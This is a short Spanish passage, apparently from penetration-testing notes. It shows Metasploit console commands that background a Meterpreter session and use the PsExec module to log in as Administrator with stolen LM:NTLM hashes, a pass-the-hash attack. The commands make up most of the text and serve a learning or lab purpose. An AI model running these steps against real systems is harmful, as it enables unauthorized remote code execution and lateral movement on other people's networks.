Con esta info ponemos las sesion de meterpreter en bacgroud y cargamos el modulo PsExec de metasploit

```
meterpreter >Crtl+z
mfs6>search psexec
msf6>use exploit/windows/smb/psexec
msf6>show options
msf6>session
msf6>set LPORT port #Cambiamos el puerto porque hay una session de meterpreter usando ese puerto
msf6>set RHOST ip
msf6>set SMBUser Administrator
msf6>set SMBPass LM:NTLM #El Hash LN y NTLM obtenido anteriormente
msf6>set target Native\ upload
msf6>exploit
```
